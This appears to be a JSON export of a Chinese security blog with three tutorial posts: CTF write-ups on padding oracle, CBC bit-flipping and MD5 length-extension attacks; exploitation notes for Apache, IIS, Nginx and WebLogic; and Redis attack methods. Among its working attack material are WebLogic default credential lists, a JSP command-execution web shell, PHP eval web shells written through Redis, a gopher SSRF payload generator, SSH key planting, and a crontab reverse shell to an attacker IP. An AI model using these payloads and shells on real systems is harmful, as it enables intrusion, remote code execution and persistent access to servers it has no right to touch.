{"meta":{"title":"ConsT27's Blog","subtitle":null,"description":"飞花","author":"ConsT27","url":"http://const27.com","root":"/"},"pages":[],"posts":[{"title":"WEB中常见的几类密码学攻击方式","slug":"WEB中常见的几类密码学攻击方式","date":"2021-06-28T13:52:26.915Z","updated":"2021-06-28T13:42:56.111Z","comments":true,"path":"2021/06/28/WEB中常见的几类密码学攻击方式/","link":"","permalink":"http://const27.com/2021/06/28/WEB%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%B1%BB%E5%AF%86%E7%A0%81%E5%AD%A6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"参考: https://www.freebuf.com/articles/database/151167.htmlhttps://www.jianshu.com/p/7f171477a603 因为是涉及密码学的东西，所以看的我头大，记录一下吧。 Padding oracle attack 与CBC翻转字节攻击异或（XOR）何为异或?异或是一种运算方法，简要概括就是同假异真 true xor true &#x3D; false; true xor false &#x3D; true;在二进制中:011 xor 110 &#x3D; 101; 二进制数每位数分别进行xor运算上面算式的运算步骤是这样的 0 xor 1 &#x3D; 1;1 xor 1 &#x3D; 0;1 xor 0&#x3D;1然后把运算结果写在一起就是101了在更高的进制中:以十进制为例: 65 xor 42 &#x3D; 107; 原理就是把十进制数字先变为二进制数进行异或，再将异或得到的二进制数结果变为十进制数在字符中:对字符进行异或运算其实就是对字符的ascii码进行异或计算，计算得到的结果视作新的一个ascii码再将其转换为字符。 xor还有一个性质，就是已知 a xor b = c 那么b xor c =a; a xor c = b.即满足异或运算里只需知道任意两个数就能得到另一个数。 CBC模式CBC是一种加密模型，采用的是分组链接模式。把明文分为一组一组进行加密 上图是CBC加密流程。最开始一个特别分组IV去和第一段密文XOR，得到的结果被密钥加密，加密得到该组的密文，同时这个密文会充当最开始的特别分组IV的作用去参与下一组的加密，以此类推。 CBC的每一个分组的加密结果都可以影响到下一个分组的加密结果， 使原本独立的分组密码加密过程形成迭代 ， 这可以强化加密算法的”敏感性”，即实现所谓的”雪崩效应”，在香浓理论中这就是”扰乱原则” 。 CBC只是一种模式，它经常把aes或des作为加密使用的算法。 DES分组长度是八字节而AES分组长度是十六字节 。 接下来是CBC解密 顺序依旧是从左到右，第一组密文被KEY解密后与IV xor得到第一组明文，同时第一组密文参与下一组的解密充当IV作用。 PKCS #5竟然CBC模式涉及到分组，那么就会出现最后一组字节没有被占满的情况。比如原本一个分组是8字节，我们有15个字节的明文需要被加密，此时最后一个分组就不会被占满（还差一个字节占满），那么这个时候要怎么办呢？ 这时候就需要对最后一个分组进行填充，将其填充满。对于采用des算法加密的内容，填充规则是PKC #5,而AES是 PKC #7.这两者唯一区别是 PKCS #5填充是八字节分组而PKCS #7是十六字节 ，还记得上面我们说过的 DES分组长度是八字节而AES分组长度是十六字节 吗？就是这个分组字节数影响了填充方式。 那么具体是怎么填充的呢，我们以PKC #5为例 当最后一组还剩n个字节未被填充时，就会填充n个 0xn字符上去.上图是PKCS #5,其实PKCS #7和PKCS #5原理是一样的，不过是分组字节数大了点罢了（0~16） Padding oracle attack上面只是铺垫，建议学懂了再来看这个攻击方式。不然会非常头大。 Padding oracle attack 攻击场景举例首先我们假设一个场景，从而引出这个攻击。 假设我们有一个任意文件包含场景 url?file&#x3D;&#x2F;etc&#x2F;passwd 黑客们看见了就会很轻而易举的去包含想要的文件。管理者发现了这个问题，对file参数采用了CBC加密，即当提交请求时，file参数的值是被加密的，然后服务器用算法解密得到其想包含的文件，然后返回给客户端。 url?file&#x3D;e28b2e3c972edab8 其中前8位数是IV，后八位数是密文。（这里是我瞎写的密文&#x3D; &#x3D;，你只需要理解到这里是一个CBC加密后的密文就行了） 那么如何去实现我们的任意文件包含呢? padding oracle attack 出现了。 攻击原理假设我们向刚刚那个任意文件包含的提交了一段密文。服务器就会尝试解密，就会出现三种结果。 1.密文不能正常解密，这种原因是在于最后一组的填充字节出现了错误2.密文能正常解密但解密出来的文件路径不存在3.密文能正常解密且能成功包含 其中第1种情况和2.3种情况网页返回的内容肯定是不同的。比如说第一种情况可能就直接返回500了，2.3可能就是302跳转啥啥的，通过这个网页返回的信息，我们就有了可乘之机。 我们先通过一个图感受一下第一组的解密流程 好的好的，感受了这个解密流程后，我们来说说攻击的事。如果我们得到了 Intermediary Value(中间值)，并且可以手动修改IV，那么我们岂不是可以构造任意Decrypted Value（明文）了？所以padding oracle attack 的核心就是去获得中间值。那么我们怎么去获取呢？ 还记得刚刚提到的3种情况吗？我们可以通过修改IV，通过判断网页返回内容来判断中间值，具体做法如下: 我们先把IV全部设置为0x00，然后修改IV的最后一个数，当其与中间值XOR后的值为0x01则此时解密就会成功，若不是0x01解密就会失败，网页会返回不同的内容，以此来判断何时解密成功。然后把解密成功时的IV的最后一位数与0x01进行异或计算，即可得到中间值的最后一位 然后我们把IV最后一位数设置为能和中间值最后一位数异或后值为0x02的数，穷举IV倒数第二个数看看哪个数能和中间值倒数第二个数异或运算后值为0x02，然后我们就可得到中间值倒数第二个数，以此类推可以获得第一组的中间值（有点绕）然后破解到了中间值我们再用最开始的IV（不是我们后面构造的IV）去和中间值异或就得到明文了当然，你也可以再次构造IV，从而构造解密出来的字符（通过中间值与IV异或） [NPUCTF2020]web🐕中的Padding oracle Attack我们以这道题为切入点，详细看看如何实现攻击。本题就是以下代码，我们要想方设法先拿到$flag &lt;?php error_reporting(0);include(&#39;config.php&#39;); # $key,$flagdefine(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); &#x2F;&#x2F;定义加密方式define(&quot;SECRET_KEY&quot;, $key); &#x2F;&#x2F;定义密钥define(&quot;IV&quot;,&quot;6666666666666666&quot;); &#x2F;&#x2F;定义初始向量 16个6define(&quot;BR&quot;,&#39;&lt;br&gt;&#39;);if(!isset($_GET[&#39;source&#39;]))header(&#39;location:.&#x2F;index.php?source&#x3D;1&#39;);#var_dump($GLOBALS); &#x2F;&#x2F;听说你想看这个？function aes_encrypt($iv,$data)&#123; echo &quot;--------encrypt---------&quot;.BR; echo &#39;IV:&#39;.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;&#125;function aes_decrypt($iv,$data)&#123; return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;); &#x2F;&#x2F;只能返回1或false&#125;if($_GET[&#39;method&#39;]&#x3D;&#x3D;&#39;encrypt&#39;)&#123; $iv &#x3D; IV; $data &#x3D; $flag; echo aes_encrypt($iv,$data);&#125; else if($_GET[&#39;method&#39;]&#x3D;&#x3D;&quot;decrypt&quot;)&#123; $iv &#x3D; @$_POST[&#39;iv&#39;]; $data &#x3D; @$_POST[&#39;data&#39;]; echo aes_decrypt($iv,$data);&#125;echo &quot;我摊牌了，就是懒得写前端&quot;.BR;if($_GET[&#39;source&#39;]&#x3D;&#x3D;1)highlight_file(__FILE__);?&gt; 我们先拿到密文 ly7auKVQCZWum/W/4osuPA==然后对其进行base64解密，发现其刚好是有16个字节，那么我们可以直接穷举IV得到中间值，然后凭此与初始IV（16个6）进行异或得到明文$flag. 话不多说，爆破中间值的脚本安排上。(借鉴了一个大佬的WP） import requestsimport base64import timeIntermediary&#x3D;&quot;&quot;url&#x3D;&quot;http:&#x2F;&#x2F;de1650aa-2b24-40e0-bb51-736ff5d38269.node3.buuoj.cn&#x2F;&#x2F;index.php?source&#x3D;1&amp;method&#x3D;decrypt&quot;iv&#x3D;&quot;&quot;hexs&#x3D;&quot;&quot;IV&#x3D;&quot;6666666666666666&quot;def xor(a,b): return &quot;&quot;.join([chr(ord(a[i])^ord(b[i])) for i in range(len(a))])for step in range(1,17): padding&#x3D;chr(step)*(step-1) print(&quot;第%s轮&quot;%step) for i in range(0,256): iv&#x3D;chr(0)*(16-step)+chr(i)+xor(Intermediary,padding) post&#x3D;&#123; &quot;iv&quot;:iv, &quot;data&quot;:&quot;ly7auKVQCZWum&#x2F;W&#x2F;4osuPA&#x3D;&#x3D;&quot; &#125; r&#x3D;requests.post(url&#x3D;url,data&#x3D;post,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;) time.sleep(0.1) print(r.text+&quot;第%s轮i&#x3D;%s &quot;%(step,i)) if &quot;False&quot; !&#x3D; r.text: Intermediary&#x3D;xor(chr(i),chr(step))+Intermediary print(Intermediary) breakfor k in range(len(Intermediary)): hexs&#x3D;&quot;%&quot;+str(ord(Intermediary[k]))+hexsprint(hexs)print(xor(Intermediary,IV)) 爆出了中间值和$flag明文 这里有些疑惑，为啥中间值会是15位的…发现$flag不是最终flag，至于接下来要做的东西，就是CBC字节翻转攻击了 CBC翻转字节攻击在对CBC模式加密的数据进行解密时，若iv可控，则可以任意控制解密后的内容。CBC翻转字节攻击不同于padding oracle attack，后者的核心是IV可控情况下获取中间值，从而可以获得明文或者任意控制密文解密后的数据。而CBC翻转字节攻击的核心思想就不是获取中间值了，而是在IV可控的情况下，通过算法缺陷来直接控制密文解密后的数据。 现在假定有中间值A,明文B1,IV C1那么就有 A^B1&#x3D;c1 一点错误都没有对吧。现在又假定有中间值A,我们想要解密出的明文B2和与之对应的IV C2那么就有 A^B2&#x3D;C2结合以上两个式子，有A&#x3D;B1^C1&#x3D;B2^C2于是有B2&#x3D;B1^C1^C2或C2&#x3D;B1^B2^C1若我们已知B1,C1,且C2可控,那么B2即可控既满足刚刚我们说的，通过算法缺陷来直接控制密文解密后的数据。 这，就是CBC翻转字节攻击，没太懂没事，看例子就行了 [NPUCTF2020]web🐕中的CBC翻转字节攻击跟进我们刚刚讲的，FlagIsHere.php,核心代码如下 X5uucFgPTVdCo9f3ZHGP8g&#x3D;&#x3D;&lt;?php #error_reporting(0);include(&#39;config.php&#39;); &#x2F;&#x2F;$fl4gdefine(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);define(&quot;SECRET_KEY&quot;, &quot;6666666&quot;);session_start();function get_iv()&#123; &#x2F;&#x2F;生成随机初始向量IV $random_iv&#x3D;&#39;&#39;; for($i&#x3D;0;$i&lt;16;$i++)&#123; $random_iv.&#x3D;chr(rand(1,255)); &#125; return $random_iv;&#125;$lalala &#x3D; &#39;piapiapiapia&#39;;if(!isset($_SESSION[&#39;Identity&#39;]))&#123; $_SESSION[&#39;iv&#39;] &#x3D; get_iv(); $_SESSION[&#39;Identity&#39;] &#x3D; base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[&#39;iv&#39;]));&#125;echo base64_encode($_SESSION[&#39;iv&#39;]).&quot;&lt;br&gt;&quot;;if(isset($_POST[&#39;iv&#39;]))&#123; $tmp_id &#x3D; openssl_decrypt(base64_decode($_SESSION[&#39;Identity&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[&#39;iv&#39;])); echo $tmp_id.&quot;&lt;br&gt;&quot;; if($tmp_id &#x3D;&#x3D;&#x3D;&#39;weber&#39;)die($fl4g);&#125;highlight_file(__FILE__);?&gt; 此时我们已知初始IV,初始密文，且IV可控，那么CBC翻转字节攻击条件成立，可以攻击。 这里贴一个别人写的python2 CBC字节反转攻击脚本自己拿python3写了半天都没写出很好的效果...import base64def bxor(b1, b2): # use xor for bytes parts &#x3D; [] for b1, b2 in zip(b1, b2): parts.append(bytes([b1 ^ b2])) return b&#39;&#39;.join(parts)iv &#x3D; base64.b64decode(&quot;h34HL5RbMPw8oTaQ+P58nw&#x3D;&#x3D;&quot;)text &#x3D; b&quot;piapiapiapia\\x04\\x04\\x04\\x04&quot;result &#x3D; b&quot;weber\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b&quot;middle &#x3D; bxor(iv,text)iv &#x3D; bxor(middle,result)print(base64.b64encode(iv)) 把跑出来的结果POST过去，就会得到下一步了.. Hash长度扩展攻击1 byte=8 bit hash算法Merkle–Damgård构造易受hash长度扩展攻击的算法有 SHA系列与MD系列，因为他们都是基于Merkle–Damgård构造。具体它是怎么结构，从下文的MD5算法可以感受到 MD5算法分组MD5算法里，会先设置好一个一个的分组，每个组的大小是512bit或者说是64bytes。 每个组都包含2个部分:1.数据区，占56bytes来记录需要被加密的字符串数据，当数据无法填满数据区时，会进行”补位”操作(请看下文解释)2.长度描述符区,用于记录“非补位”数据的大小,占8个byte，其值为该组数据区种非补位数据的bit大小的16进制值。比如非补位数据是admin,其占5个byte，40个bit，40的十六进制是28，所以其值会是28。然后这个值会以一种叫做小端存储的方式记录到长度描述符区。（非补位数据指该组的非填充的数据，即真正需要被加密的字符串） 补位很简单，若某个组的数据长度小于56byte，该组的数据区不会被占满，那么就会自动补位来使数据区被填满。 其规则是在数据后先添加一个80字节，然后再用00字节填充完整个数据区。 分组与补位小结再更进一步的了解MD5算法前，需要更加深刻地理解一下分组与补位，不然稍后的理解会非常困难。 加密流程这里放张自己画的加密流程的图 字符串先分组，然后第一组与初始链进行复杂数学运算得到链1.注意，这里的初始链是固定的，每个MD5运算的初始链都是固定的，其值就是图中所记录的。也就是说，无论对什么数据进行MD5加密，其初始链都是 0x674523010xefcdab890x98badcfe0x10325476 ok。第一组数据与初始链进行复杂运算得到链1，然后链1与第二组数据进行复杂运算得到链2，如此往复，直到倒数第二条链与最后一组数据进行复杂运算得到最后一条链(链final) 然后链final进行高低位转换就得到最终hash，那么什么是高低位转换？ 如果final链是 A=0x20f4847a B=0x42e6abf8 C=0xf9097423 D=0x51a8dad4 那么其hash便是 7a84f420f8abe642237409f9d4daa851 hash长度扩展攻击基础知识掌握了，就开始了解这个重头戏了。 以一道题为切入点（改了一下实验吧的一道题） Your cookies don&#39;t match up! STOP HACKING THIS SITE. &lt;?phpinclude &quot;flag.php&quot;;&#x2F;&#x2F;$secret&#x3D;&quot;XXXXXXXXXXXXXXX&quot;; This secret is 15 characters long for security!$username&#x3D;&quot;admin&quot;;$password &#x3D; $_POST[&quot;password&quot;];if($_POST[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password)))&#123; if(is_numeric(strpos($password,&quot;abc&quot;)))&#123; echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); &#125;&#125;else&#123; echo(&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);&#125;highlight_file(__FILE__);echo(md5($secret . urldecode($username . &quot;admin&quot;)));?&gt; 93a5e7bea9c040065617b1a62ffc3d72 从中我们可以得知secret长度是15，md5($sercet.”adminadmin”)=93a5e7bea9c040065617b1a62ffc3d72题目的意思很明显，我们需要传两个参数getmein和password使得getmein=md5($secret.”admin”.password),且password包含abc字符 那么这就是hash长度扩展攻击经典的使用典例，即:知道salt长度（这里secret变量的长度）知道一组被加密字符串长度小于56的样本（ md5($sercet.”adminadmin”) 的值）即可知道某个值与salt一起被MD5加密后的hash 那这种攻击是如何实现的呢？首先我们知道了一组样本，即等于我们知道了该样本的final链（高低位变换）。同时我们知道了salt长度，即等于我们可以构造出该分组。那么如果我们又构造出一个新的分组，同时其上一个组是已知样本，那么与新分组进行复杂运算的就是已知样本的final链。已知样本的final链，新分组的待加密字符串，即可通过复杂运算，高低位变换获得最终hash。故新分组待加密字符串的hash值是可以预测的。这，就是hash长度扩展攻击的原理。可能还是云里雾里的，那就看如何解题吧。 因为已知salt长度，那么可以预测一下样本的分组的情况因为salt+adminadmin的长度是25，那么其bit就是200，转换为16进制就是c8.那么假设salt字符全为x（仅仅是个假设而已，别想太多了），该分组的情况 那么我们可以传参password=admin%80%00*30abc其中abc以前的字符会在被MD5运算的时候分配到前一个组，然后通过运算获得链1，这个链1就是我们已知样本的final链了。然后我们就可以预知，这个final链与abc进行复杂运算，高低位变换得到的hash了。然后再把这个hash赋值给openmein，这个题就做出来了。 好的，大致原理就是这样了。这时候可以自行写脚本来找到某明文对应的MD5密文，或者使用工具:hashpump. ![ ](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217152515.png)","categories":[],"tags":[{"name":"杂七杂八的安全问题","slug":"杂七杂八的安全问题","permalink":"http://const27.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"}]},{"title":"常见中间件的攻击方式","slug":"常见中间件的攻击方式","date":"2021-06-28T13:52:18.718Z","updated":"2021-06-28T13:46:47.143Z","comments":true,"path":"2021/06/28/常见中间件的攻击方式/","link":"","permalink":"http://const27.com/2021/06/28/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"apacheapache文件多后缀名解析漏洞与其说这是一个漏洞，不如说这是一个特性，很多程序员不知道这种特性，所以会写出有问题的代码。特性：多后缀名(全版本都有这个特性）apache在解析一个文件的后缀名时，是从右往左解析后缀名的，如果右边的后缀名不认识，就会继续向左识别，直到识别到一个认识的后缀名，但是万一都不认识呢?都不认识的话默认情况下是plain/text处理。那么apache是怎么知道哪个后缀名它是认识的呢?答案是认识的后缀名们都被记录到一个叫mime.types的文件中了。这个文件呢,Windows放在conf文件夹里，linux放在/etc/mime.types（不一定在这里，需要自己找找）,打开后是这样 定义了不同的后缀名应该向浏览器返回什么样的mime格式。这里要说的是有些情况下的mime.types没有提供对php的解析方法，对php的解析规则放在另一个文件，Windows下在/conf/extra/httpd-php.conf。Linux也有这个文件在/etc/apache2/mods-enabled/php7.2.conf（或者和Windows的路径一样),打开后是这样的，定义了文件名满足什么条件(正则表达式)才会将他给php处理器处理,而且，如果你mime.types里匹配到了php后缀，但这个处理器匹配文件没有匹配成功，他还是不会把php文件进行处理 可以试一试，确实是这样的,apache对这个文件第一个匹配到的后缀名是jpg，所以把它当作图片处理了，返回了图片类型的mime头，浏览器也就把这个文件当作图片处理，于是出现了这种情况 当然，用这种多域名特性去解析php文件的话，就需要在上文提到的文件里去修改修改哦。 apache 换行绕过2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 apache ssi远程命令执行漏洞（原理和ssi注入一样）如果服务器开启了ssi与cgi支持,即可上传shtml文件并在shtml文件中输入ssi指令 &lt;!–#exec cmd=”payload” –&gt;，如 &lt;!–#exec cmd=”ls” –&gt; ,然后再访问这个文件即可获得ls的结果 iis关于/的php解析漏洞(iis7/7.5解析漏洞)适用版本 iis7/7.5前提条件:1.php.ini里的cgi.fix_pathinfo设置为1,且结合方式是fast-cgi 2.开启Fast-CGI运行模式作用: 在访问某个文件时，在路径后加 /.php(这里的指任意字符)，即可让服务器把把该文件当作php文件解析并返回如图我在一个txt文件中写入php代码，让后访问它时在路径最后加了/a.php，它就被解析为php文件了 PUT任意文件上传漏洞1.适用版本 iis6.02.前提条件:服务器开启了webdav服务并且设置了写入权限 同时找到访问网站的用户是哪个并给他读取和写入权 3.概述：用PUT方法上传文件,并尝试getshell 上传,并且确实上传成功，但是大多数情况下无法上传php等脚本文件 这个时候我们就会想到用move方法来将txt文件转化为php文件,但直接move往往是不行的，要用到iis6.0解析漏洞，把它写成shell.php;.txt就可以了getshell了 iis6畸形解析漏洞iis6.0环境下会把文件畸形解析: 1.在一个文件后面加;.任意后缀名：假设有个文件是a.php，我们把它改成a.php;a.txt，他还是会被解析成php文件但是因为后缀名是txt所以会绕过一些防护2.在一个名为 *.php(如a.php)的文件夹下的所有文件都会被解析为php Nginx‘/’字符解析漏洞（和iis7/7.5漏洞利用方法一致）url/xxx.gif/xx.php会被解析为php文件 前提条件:cgi.fix_pathinfo=1 目录遍历小洞 前提条件: nginx-conf 把这个选项改为on即可 目录穿越 前提概要:要用到别名alias作用: 当设置别名时，location后面的路径没有用/闭合时，就会引起访问 url/xx../时返回的目录是当前文件夹的上层目录可见返回的目录是上层目录 CRLF注入前提条件与产生原因:1.随着业务的发展，有些网站会把http://xxx 重定向为https://xxx或http://x.com重定向为http://www.x.com,那么这种重定向的原理在nginx上的实现方式是在location块里加入return 302 http://$host:81$uri;之类的语句，这里的$host,$url都是变量。$host一般为请求头的host头部,$url一般为请求行里的路径部分 如 GET /url HTTP/1.1此处的/url部分. 2.http头部里，0d（cr）和0a（lf）字符是用来分割请求头部区域的字符。头部的行是以一个crlf来分割的，也就是说请求头部每个行之间都存在着一个crlf字符来分割它们，让他们成为多个独立的行。头部与body之间有两个crlf来分割作用:当某台nginx设置了形如return 302 http://$host:80$uri; 这种配置时，url是我们完全可控的，所以可以在url中人为构造crlf字符来实现分行，从而在响应头中注入我们想要得到的响应头部。 Nginx 文件名逻辑漏洞（CVE-2013-4547）Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7url/xxxxx.gif%20 的文件被 url/xxxxx.gif%20\\0x00.php (\\0x00须在burp里的hex里改)需开启fastcgi 然后发包请求这个文件,并且在请求时做点手脚 WebLogic弱口令User ID systemPassword passwordLevel AdministratorUser ID weblogicPassword weblogicLevel AdministratorUser ID weblogicPassword weblogicUser ID adminPassword securityUser ID joePassword passwordUser ID maryPassword passwordUser ID systemPassword securityUser ID wlcsystemPassword wlcsystemUser ID wlpisystemPassword wlpisystem 任意文件读取基础上的后台密码破解假设我们能前台任意文件读取,但是后台的账户密码是加密的.如何破解weblogic新版本用的是AES加密，老版本用的是3DES加密都是对称加密，有密钥就可解 假设前台可以任意文件读取，那么我们只要用到用户的密文和加密的密钥即可破解。这两个文件在base_domain下, 为./security/SerializedSystemIni.dat和config/config.xml这里值得一提的是,.dat文件是二进制文件,建议burp打开不然容易乱码 把二进制信息copy to file保存下来. 获取config.xml xml文档里这才是管理员账户开始解密，这里使用的是 https://github.com/TideSec/Decrypt_Weblogic_Password 中的tools5 解密成功。登录就完事了 后台传木马提权后台传jsp木马的war包就行了怎么生成war包:jar cvf shell.war 木马源文件 部署-》安装-》上载文件-》选择文件选择war包-》一直下一步然后完成 访问war包目录下的木马文件即可 马子是一句话马子 &lt;%Runtime.getRuntime.exec(request.getParameter(“cmd”));%&gt;命令建议用这个网站编码一下，不然有可能不会执行 http://www.jackson-t.ca/runtime-exec-payloads.html weblogic uudi组件造成的端口探测若weblogic加载了uudi组件，那么在 /uddiexplorer/SearchPublicRegistries.jsp 会存在端口探测问题 对该jsp传参 ?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001 我们通过改变operator的端口发包，看页面变化即可端口探测 端口不存在，就会有could not connect over HTTP to server: 存在就有404 error code (Not Found). Please ensure that your URL is correct, Weblogic 任意文件上传漏洞（CVE-2018-2894）WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do 影响版本 Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。 前提条件:管理员在后台 -&gt;base_domain-&gt;配置-&gt;一般信息-&gt;高级，把这个勾选了 开启后我们来到 http://ip:port/ws_utc/config.do ，把这个改为路径 /user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css 然后点安全，再点添加，把我们的jsp马传上去 抓包，获取该木马的时间戳 访问http://123.57.137.109:7001/ws_utc/css/config/keystore/时间戳_文件名 成功访问我的马儿修复: 设置Config.do、begin.do页面登录授权后访问 ,升级，加waf","categories":[],"tags":[{"name":"中间件安全","slug":"中间件安全","permalink":"http://const27.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/"}]},{"title":"redis的一些攻击方式","slug":"redis的一些攻击方式","date":"2021-06-28T13:52:13.411Z","updated":"2021-06-28T13:43:22.470Z","comments":true,"path":"2021/06/28/redis的一些攻击方式/","link":"","permalink":"http://const27.com/2021/06/28/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"参考 https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/ Redis默认端口6379如果存在未授权问题，那么任何人都可以往这台Redis服务器上传输命令 一般Redis攻击有写shell（最常用），写密钥，写crontab反弹shell, info获得敏感信息,其中写密钥和写crontab不是那么的好用 在讲攻击之前，要讲一下RESP协议 RESP协议Redis服务器与客户端通过RESP协议的通信。resp协议从redis1.2引入。这个协议把服务器与客户端之间的数据以一种序列化的形式处理并传输 在RESP中，某些数据的类型取决于第一个字节：对于Simple Strings，回复的第一个字节是+对于error，回复的第一个字节是-对于Integer，回复的第一个字节是:对于Bulk Strings，回复的第一个字节是$，发送给服务器的命令就是放在数组中的BulkStrings类型对于array，回复的第一个字节是*此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。在RESP中，协议的不同部分始终以&quot;\\r\\n&quot;(CRLF)结束。 同时每个类型字节后紧跟着该类型的长度，然后是CRLF，然后是该类型的值 说了这么多，肯定不会很懂，上图 即发送的时候，是用三个元素的数组(*3),第一个元素是三个长度的BulkString($3)其值为set,第二个元素是四个长度的BulkSting($4)其值为name,第三个元素是四个长度长的BulkString($4)其值为test,服务器返回SimpleString（+）OK，以下类推 gopher协议是http协议出现常用的一个协议，SSRF的万金油。 格式：gopher://IP:port/_{TCP/IP数据流} 如何redis远程链接redis-cli -h ip -p portxxx.xxx.xxx.xxx:x&gt;AUTH &quot;password&quot; (未授权就不需要输入密码) 攻击方法一:写shell写shell的话,redis需执行的命令应该类似这样 如果你能直接redis -h ip -n 6379 未授权连接上redis服务器且权限够高，可以直接输入以下命令flushall &#x2F;&#x2F;清空数据库set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39; &#x2F;&#x2F;为键名为1的键赋值config set dir &#x2F;var&#x2F;www&#x2F;htmlconfig set dbfilename shell.php &#x2F;&#x2F;设置数据存储到磁盘时的文件路径save &#x2F;&#x2F;数据库全部保存至磁盘 攻击脚本如下(主要用于ssrf) #python3import urllibprotocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;ip&#x3D;&quot;192.168.163.128&quot;port&#x3D;&quot;6379&quot;shell&#x3D;&quot;\\n\\n&lt;?php eval($_GET[\\&quot;cmd\\&quot;]);?&gt;\\n\\n&quot;filename&#x3D;&quot;shell.php&quot;path&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;html&quot;passwd&#x3D;&quot;&quot;cmd&#x3D;[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),&#x2F;&#x2F;这里的IFS替换不是很理解是啥意思.. &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd)) &#x2F;&#x2F;如果需要密码，就把密码输入命令加入到cmd第一位payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;def redis_format(arr): CRLF&#x3D;&quot;\\r\\n&quot; redis_arr &#x3D; arr.split(&quot; &quot;) cmd&#x3D;&quot;&quot; cmd+&#x3D;&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+&#x3D;CRLF return cmdif __name__&#x3D;&#x3D;&quot;__main__&quot;: for x in cmd: payload +&#x3D; urllib.quote(redis_format(x)) print(payload) 这样的话，我们就得到了payload，直接curl一下，就写入shell了 攻击方法二:info获取敏感信息连上后 使用info命令 攻击方法三：写入ssh公钥高版本不好用，因为高版本的redis权限是无法往/root目录写入的.而这个方法则需要往/root/.ssh写入ssh公钥达到无密码ssh链接的目的 首先在攻击机上生成一对不需要密码的公钥私钥 然后依次输入 config set dir &#x2F;root&#x2F;.sshconfig set dirfilename authorized_keyssave 然后ssh免密登录 ssh -i id_rsa root@ip 攻击方法四：利用cron计划任务反弹shell仅在centos系统奏效，Ubuntu不行 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/权限必须是600也就是-rw-------才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件/var/spool/cron/权限644也能执行 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错 由于系统的不同，crontrab定时文件位置也会不同Centos的定时任务文件在/var/spool/cron/Ubuntu定时任务文件在/var/spool/cron/crontabs/Centos和Ubuntu均存在的（需要root权限）/etc/crontab PS：高版本的redis默认启动是redis权限，故写这个文件是行不通的 命令如下set x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.131&#x2F;888 0&gt;&amp;1\\n&quot;config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;config set dbfilename rootsave 